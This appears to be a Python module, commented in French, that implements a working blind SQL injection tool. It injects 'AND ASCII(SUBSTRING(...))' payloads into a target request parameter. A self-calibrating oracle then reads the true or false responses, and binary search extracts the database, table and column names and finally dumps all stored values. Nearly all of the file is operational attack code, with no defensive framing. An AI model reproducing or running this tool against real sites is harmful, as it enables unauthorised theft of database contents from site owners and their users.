import requests
import difflib
 
 
def similarity(a, b):
    """Ressemblance 0..1 entre deux corps de reponse (compare le CONTENU, pas la taille)."""
    return difflib.SequenceMatcher(None, a, b).ratio()
 
 
class Oracle:
    """Auto-calibre sur une page VRAIE et une page FAUSSE connues.
       Aucun seuil fixe : la fiabilite se mesure contre le BRUIT naturel du site."""
 
    def __init__(self, true_resp, false_resp, noise_ref):
        self.true_status = true_resp.status_code
        self.false_status = false_resp.status_code
        self.true_body = true_resp.text
        self.false_body = false_resp.text
        # signal distinctif : status differents (error-based) ou contenu different (boolean) ?
        self.use_status = (self.true_status != self.false_status)
        # bruit = ressemblance entre deux pages "vraies" (baseline vs always-true)
        self.noise = similarity(noise_ref.text, true_resp.text)
 
    def reliable(self):
        """Vrai/Faux distinguables au-dela du bruit ? Sinon param non exploitable."""
        if self.use_status:
            return True
        return similarity(self.true_body, self.false_body) < self.noise
 
    def is_true(self, resp):
        """Classe une reponse quelconque en vrai/faux, sans seuil."""
        if self.use_status:
            return resp.status_code == self.true_status
        return similarity(resp.text, self.true_body) >= similarity(resp.text, self.false_body)
 
 
def send(url, params, method):
    if (method == "GET"):
        gurl = requests.get(url.geturl(), params=params)
        return gurl
    else:
        purl = requests.post(url.geturl(), data=params)
        return purl
 
 
def bsearch_req(ctx, expression, mid, i):
    payload = f" AND ASCII(SUBSTRING({expression},{i},1))>{mid}"
    copy = ctx.params.copy()
    copy[ctx.name] = ctx.params[ctx.name][0] + payload
    copy_r = send(ctx.url, copy, ctx.method)
    return 1 if ctx.oracle.is_true(copy_r) else 0
 
 
def bsearch(ctx, expression, i):
    lo = 0
    hi = 255
    while (lo != hi):
        mid = (lo + hi) // 2
        if (bsearch_req(ctx, expression, mid, i) == 1):
            lo = mid + 1
        else:
            hi = mid
    return lo
 
 
def extract(ctx, expr):
    result = ""
    i = 1
    while i < 256:                 # garde-fou : jamais de boucle infinie
        c = bsearch(ctx, expr, i)
        if c == 0:
            break
        result += chr(c)
        i += 1
    return result
 
 
def extract_columns(ctx, tables, engine):
    result = {}
    for t in tables:
        columns = []
        columns.append("")
        while True:
            seen = ",".join(f"'{c}'" for c in columns)
            col = extract(ctx, engine["columns"].format(t=t, seen=seen))
            if (col == ""):
                break
            columns.append(col)
        columns.pop(0)
        result[t] = columns
    return result
 
 
def extract_tables(ctx, engine):
    tables = []
    tables.append("")
    while True:
        seen = ",".join(f"'{t}'" for t in tables)
        c = extract(ctx, engine["tables"].format(seen=seen))
        if c == "":
            break
        tables.append(c)
    tables.pop(0)
    return tables
 
 
def extract_bases(ctx, engine):
    bases = []
    bases.append("")
    while True:
        seen = ",".join(f"'{t}'" for t in bases)
        c = extract(ctx, engine["bases"].format(seen=seen))
        if c == "":
            break
        bases.append(c)
    bases.pop(0)
    return bases
 
 
def dump(ctx, table, columns, engine):
    result = {}
    for c in columns:
        values = [""]
        while True:
            seen = ",".join(f"'{v}'" for v in values)
            v = extract(ctx, engine["value"].format(c=c, t=table, seen=seen))
            if v == "":
                break
            values.append(v)
        result[c] = values[1:]
    return result
 
 
def dump_db(ctx, engine):
    data = {}
    bases = extract_bases(ctx, engine)
    tables = extract_tables(ctx, engine)
    columns = extract_columns(ctx, tables, engine)
    for t, c in columns.items():
        data[t] = dump(ctx, t, c, engine)
    final_dump = {"bases": bases, "data": data}
    return final_dump